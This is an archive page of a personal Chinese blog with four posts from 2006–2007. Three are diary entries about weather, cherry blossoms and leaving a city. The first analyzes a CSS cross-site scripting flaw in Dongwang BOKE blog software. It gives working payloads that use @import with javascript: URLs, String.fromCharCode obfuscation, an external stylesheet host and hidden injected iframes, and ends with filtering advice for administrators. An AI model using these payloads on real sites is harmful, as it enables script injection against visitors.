@@ -1,0 +1,77 @@
+<!DOCTYPE html><html lang="zh" class="false"><head><meta charset="UTF-8"><style>:where(img){height:auto}</style><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="canonical" href="https://n2g.cn/posts/9/"><meta name="generator" content="Astro v4.2.1"><!-- General Meta Tags --><title>Posts | Xio's</title><meta name="title" content="Posts | Xio's"><meta name="description" content=""><meta name="author" content="Xio"><link rel="sitemap" href="/sitemap-index.xml"><!-- Open Graph / Facebook --><meta property="og:title" content="Posts | Xio's"><meta property="og:description" content=""><meta property="og:url" content="https://n2g.cn/posts/9/"><meta property="og:image" content="https://n2g.cn/frynut-logo.png"><!-- Article Published/Modified time --><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://n2g.cn/posts/9/"><meta property="twitter:title" content="Posts | Xio's"><meta property="twitter:description" content=""><meta property="twitter:image" content="https://n2g.cn/frynut-logo.png"><!-- Google Font --><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin=""><link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,400;0,500;0,600;0,700;1,400;1,600&amp;display=swap" rel="stylesheet"><link href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@400;700&amp;display=swap" rel="stylesheet"><meta name="theme-color" content=""><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><!-- 
+    <script is:inline src="/toggle-theme.js"></script> --><style>@keyframes astroFadeInOut{0%{opacity:1}to{opacity:0}}@keyframes astroFadeIn{0%{opacity:0}}@keyframes astroFadeOut{to{opacity:0}}@keyframes astroSlideFromRight{0%{transform:translate(100%)}}@keyframes astroSlideFromLeft{0%{transform:translate(-100%)}}@keyframes astroSlideToRight{to{transform:translate(100%)}}@keyframes astroSlideToLeft{to{transform:translate(-100%)}}@media (prefers-reduced-motion){::view-transition-group(*),::view-transition-old(*),::view-transition-new(*){animation:none!important}[data-astro-transition-scope]{animation:none!important}}
+</style>
+<link rel="stylesheet" href="/_astro/index.yOUqx45_.css">
+<style>.waline-container:where(.astro-ksttp56e){border-top:1px solid #ddd;margin:2em 0;padding:1em 0}</style><script type="module" src="/_astro/hoisted.FddQO928.js"></script></head> <body>  <header> <div class="content"> <div class="nav-container"> <div class="top-nav-wrap"> <a href="/" class="logo"> <span>Xio's</span> </a> <nav id="nav-menu"> <button class="focus-outline hamburger-menu" aria-label="Open Menu" aria-expanded="false" aria-controls="menu-items"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="menu-icon"> <line x1="7" y1="12" x2="21" y2="12" class="line"></line> <line x1="3" y1="6" x2="21" y2="6" class="line"></line> <line x1="12" y1="18" x2="21" y2="18" class="line"></line> <line x1="18" y1="6" x2="6" y2="18" class="close"></line> <line x1="6" y1="6" x2="18" y2="18" class="close"></line> </svg> </button> <ul id="menu-items" class="display-none sm:flex"> <li> <a href="/" class="active">
+日志
+</a> </li> <li> <a href="/links/" class="">
+邻居
+</a> </li> <li> <a href="/about/" class="">
+关于
+</a> </li> <li> <a href="/search/" class="group inline-block hover:text-skin-accent flex focus-outline p-3 sm:p-1" aria-label="search" title="Search"> <svg xmlns="http://www.w3.org/2000/svg" class="scale-125 sm:scale-100"><path d="M19.023 16.977a35.13 35.13 0 0 1-1.367-1.384c-.372-.378-.596-.653-.596-.653l-2.8-1.337A6.962 6.962 0 0 0 16 9c0-3.859-3.14-7-7-7S2 5.141 2 9s3.14 7 7 7c1.763 0 3.37-.66 4.603-1.739l1.337 2.8s.275.224.653.596c.387.363.896.854 1.384 1.367l1.358 1.392.604.646 2.121-2.121-.646-.604c-.379-.372-.885-.866-1.391-1.36zM9 14c-2.757 0-5-2.243-5-5s2.243-5 5-5 5 2.243 5 5-2.243 5-5 5z"></path> </svg> <span class="sr-only">Search</span> </a> </li> </ul> </nav> </div> </div> </div> </header>   <div> <main id="main-content" class="content"> <h1></h1> <p></p>  <ul class="card-ul"> <li class="card-list-li"><div class="date-box"><span class="italic text-sm">Mar<!-- --> <!-- -->16<!-- -->, <!-- -->2007</span></div><a href="/posts/pjblog-2007-03-16/" class="card-title"><h2 style="view-transition-name:pjblog-2007-03-16" class="decoration-dashed font-medium hover:underline text-xl">动网BOKE的CSS跨站漏洞分析</h2></a><div class="post-content"><p>前一段时间，找到了动网 BOKE的跨站漏洞，这个漏洞可以用CSS来跨站，也就是样式表，具体的跨站方法是：</p>
+<h2>基本利用方法</h2>
+<p>选择"代码"方式，在其中输入以下代码：</p>
+<pre><code>&lt;style type='text/css'&gt;@import url(http://www.pc010.cn/1.css);&lt;/style&gt;
+</code></pre>
+<p>其中的@import 是CSS的自定义属性，url是要链接的CSS样式，而 http://www.pc010.cn/1.css 的内容如下：</p>
+<pre><code>&lt;style type="text/css"&gt;
+&lt;!--
+@import url(javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,84,101,115,116,32,49,39,41,59,97,108,101,114,116,40,39,84,101,115,116,32,50,39,41,59)));
+--&gt;
+&lt;/style&gt;
+</code></pre>
+<p>这是一段弹出alert窗口的代码，其中的String.fromCharCode是用来将字符转为ASCII值的函数。</p>
+<h2>打开新窗口的代码</h2>
+<p>OPEN 的代码如下：</p>
+<pre><code>@import url(javascript:eval(String.fromCharCode(111,112,101,110,40,39,104,116,116,112,58,47,47,119,119,119,46,110,111,104,97,99,107,46,99,110,39,44,39,-17702,-16435,-13610,-19743,39,44,39,119,105,100,116,104,61,50,48,48,44,104,101,105,103,104,116,61,50,48,48,39,41,59)));
+</code></pre>
+<h2>隐藏显示方法</h2>
+<p>如果是要在当前窗口隐藏显示，可用document.body.innerHTML方法，代码是：</p>
+<pre><code>document.body.innerHTML=document.body.innerHTML+"&lt;iframe frameborder=0 width=200 height=200 scrolling=no src=http://www.pc010.cn&gt;&lt;/iframe&gt;";
+</code></pre>
+<p>将以上的字符用ASCII转换工具转为ASCII值，放入String.fromCharCode函数中，就可以了。</p>
+<h2>简化的利用方式</h2>
+<p>当然，也可以不用String.fromCharCode函数，直接引入代码的语句是：</p>
+<pre><code>@import url(javascript:eval("document.body.innerHTML=document.body.innerHTML+'&lt;iframe frameborder=0 width=200 height=200 scrolling=no src=http://www.baidu.com&gt;&lt;/iframe&gt;';"));
+</code></pre>
+<p>其中字符要用双引号引入才行。</p>
+<h2>最简单的方法</h2>
+<p>如果再去掉eval，那么语句就是：</p>
+<pre><code>@import url(javascript:document.body.innerHTML=document.body.innerHTML+"&lt;iframe frameborder=0 width=200 height=200 scrolling=no src=http://www.baidu.com&gt;&lt;/iframe&gt;");
+</code></pre>
+<p>常量用双引号引入，而变量则直接引入，两者之间用+来连接，如果有特殊的字符，则可用String.fromCharCode进行转换，比如"&lt;"，则可用String.fromCharCode(60)代替。</p>
+<h2>技术总结</h2>
+<p>这个漏洞利用了CSS的@import特性和javascript:协议的结合，绕过了常规的XSS过滤。动网BOKE在处理用户输入的CSS代码时没有进行充分的过滤，导致了这个安全问题。</p>
+<p>这种利用方式比较隐蔽，因为表面上看起来只是在引入CSS样式文件，实际上却执行了恶意的JavaScript代码。</p>
+<p>建议网站管理员对用户输入的CSS代码进行严格过滤，特别是@import和javascript:这类可能存在安全风险的内容。</p>
+</div></li><li class="card-list-li"><div class="date-box"><span class="italic text-sm">Mar<!-- --> <!-- -->04<!-- -->, <!-- -->2007</span></div><a href="/posts/pjblog-2007-03-04/" class="card-title"><h2 style="view-transition-name:pjblog-2007-03-04" class="decoration-dashed font-medium hover:underline text-xl">关于10级大风的预报</h2></a><div class="post-content"><p>昨天老爸说今天会有10级大风，我怎么也想不到这个偏僻的山区会有这么大的风。开玩笑对隔房表姐说，你还是把你的信用卡拿上躲到红薯窖里面去吧，呵呵。</p>
+<p>结果风确实起了，但没有预报的那么大。</p>
+<p>最近手气不错，昨天又赢钱了。不过这样下去，朋友们都要说我成赌徒了。</p>
+<p>有点郁闷，TOM那边出了点状况，下起了暴雪！等会上QQ问问情况再说。</p>
+<p>先这样了。</p>
+<hr>
+<p><em>写于2007年3月4日，记录当时的生活片段。</em></p>
+</div></li><li class="card-list-li"><div class="date-box"><span class="italic text-sm">Mar<!-- --> <!-- -->01<!-- -->, <!-- -->2007</span></div><a href="/posts/pjblog-2007-03-01/" class="card-title"><h2 style="view-transition-name:pjblog-2007-03-01" class="decoration-dashed font-medium hover:underline text-xl">樱花又开了</h2></a><div class="post-content"><p><img src="/images/07yc_pic00013.jpg.jpg" alt="樱花盛开" fetchpriority="high" decoding="async" width="640" height="480"></p>
+<p><img src="/images/96yc_pic00016.jpg.jpg" alt="春日樱花" fetchpriority="high" decoding="async" width="640" height="480"></p>
+<p><img src="/images/xum1_pic00017.jpg.jpg" alt="樱花枝头" fetchpriority="high" decoding="async" width="640" height="480"></p>
+<p><img src="/images/gd6k_pic00018.jpg.jpg" alt="满树樱花" fetchpriority="high" decoding="async" width="1280" height="960" srcset="/images/gd6k_pic00018.jpg.jpg 1280w, /images/gd6k_pic00018@980w.jpeg 980w" sizes="100vw"></p>
+<p>樱花又开了，春天真的来了。</p>
+<p>每年这个时候，看到满树的樱花，总是让人心情愉悦。粉色的花瓣在微风中轻舞，仿佛在告诉我们，新的一年又开始了。</p>
+<hr>
+<p><em>拍摄于2007年3月1日</em></p>
+<p><em>天气：多云</em></p>
+</div></li><li class="card-list-li"><div class="date-box"><span class="italic text-sm">Jul<!-- --> <!-- -->23<!-- -->, <!-- -->2006</span></div><a href="/posts/pjblog-2006-07-23/" class="card-title"><h2 style="view-transition-name:pjblog-2006-07-23" class="decoration-dashed font-medium hover:underline text-xl">我在7月的最惨淡时刻</h2></a><div class="post-content"><p>秋天还没到来，我却又要飘了，然而，此时此刻却再没有黄叶做伴....</p>
+<p>绵阳是一个不大不小的城市，拥有形形色色其他城市不能攀比的韵味。可是我却并不留恋在一个固定的地方，比如这个城市。当然，除了我在绝望时会怀念归宿，我就绝不会有其他例外了。我不知道什么东西才能抵制住我飘的欲望，也许，根本就不会有什么东西来抑制我的思想，又或许我本来就注定是漂浮不定的...</p>
+<p>明天，我就要踏上回家的列车回到我久违的故乡，我知道那里现在一定是绿树成荫，花开正好，温度适宜清爽的美好季节。我明白，在那样的空间里面会让我忘记很多不想纪念的事情，我期待父亲叫我吃饭的声音，依然怀念我和老爸抢电脑玩的那激动场面，甚至是一起玩玩麻将也行，这都是令我神往的事情，当然这只是在一种特定场面下的幸福感觉！</p>
+<p>对于绵阳，我不知道我到底收获了什么，或者是收益了什么，更或者是说我为什么能够在绵阳待这么久，我都不是很清楚。唯一肯定的是工作是次要的约束因素，更主要在于某种精神或者是某种执着。当然，我的再次漂泊不能毫无凭据地就说我已经没了那种精神或者是执着，我想环境会改变一个人的思想，并且完善它！</p>
+<p>这一次漂流大行动中，我为了给自己一个很好的理由，我说了，下一个城市一定更美，那里会拥有AS ROMA的火爆，也拥有酒吧的另类，并且又有着能美容的空气...有什么理由不离开这里去创造，去发掘，去适应一个新的城市呢？</p>
+<p>...我说了，我的离开对我来说不惨淡，而是对这里的一些朋友们来讲，我是不应该离开的！</p>
+<p>八月的时候，我又在期待明年的沿海，明年的华侨，明年的那所大学，我相信，命运总是公平的。</p>
+<hr>
+<p><em>写于2006年7月23日 17:14 QQ空间</em></p>
+<p><em>那些年轻时关于漂泊与归宿的思考</em></p>
+</div></li> </ul>  </main>  <nav class="content pagination-wrapper" aria-label="Pagination"><a href="/posts/8/" class="group inline-block hover:text-skin-accent select-none mr-4" aria-label="Previous">
+&lt;
+</a><a href="/posts/" class="group inline-block hover:text-skin-accent select-none mx-1" aria-label="Page 1">1</a><a href="/posts/2/" class="group inline-block hover:text-skin-accent select-none mx-1" aria-label="Page 2">2</a><a href="/posts/3/" class="group inline-block hover:text-skin-accent select-none mx-1" aria-label="Page 3">3</a><a href="/posts/4/" class="group inline-block hover:text-skin-accent select-none mx-1" aria-label="Page 4">4</a><a href="/posts/5/" class="group inline-block hover:text-skin-accent select-none mx-1" aria-label="Page 5">5</a><a href="/posts/6/" class="group inline-block hover:text-skin-accent select-none mx-1" aria-label="Page 6">6</a><a href="/posts/7/" class="group inline-block hover:text-skin-accent select-none mx-1" aria-label="Page 7">7</a><a href="/posts/8/" class="group inline-block hover:text-skin-accent select-none mx-1" aria-label="Page 8">8</a><a href="/posts/9/" class="group inline-block hover:text-skin-accent select-none mx-1 active" aria-label="Page 9">9</a><span class="group inline-block select-none disabled ml-4" aria-label="Next" aria-disabled="true">
+&gt;
+</span></nav> </div> <footer class="astro-sz7xmlte"> <div class="astro-sz7xmlte content"> <div class="astro-sz7xmlte footer-wrapper"> <div class="astro-sz7xmlte copyright-wrapper"> <span class="astro-sz7xmlte"><img src="/assets/logo.svg.svg" alt="Xio's" width="30" height="30" class="astro-sz7xmlte" loading="lazy" decoding="async"> </span> <span class="astro-sz7xmlte">Xio's © 2025 .</span> <span class="astro-sz7xmlte slogan">一切从简，记录生活。</span> <a target="_blank" href="/rss.xml" class="astro-sz7xmlte rss-link" aria-label="rss feed" title="RSS Feed"> <span class="astro-sz7xmlte sr-only">RSS Feed</span> <svg xmlns="http://www.w3.org/2000/svg" class="astro-sz7xmlte rss-icon"><path d="M19 20.001C19 11.729 12.271 5 4 5v2c7.168 0 13 5.832 13 13.001h2z" class="astro-sz7xmlte"></path><path d="M12 20.001h2C14 14.486 9.514 10 4 10v2c4.411 0 8 3.589 8 8.001z" class="astro-sz7xmlte"></path><circle cx="6" cy="18" r="2" class="astro-sz7xmlte"></circle> </svg> </a> </div> </div> </div> </footer>    </body></html>
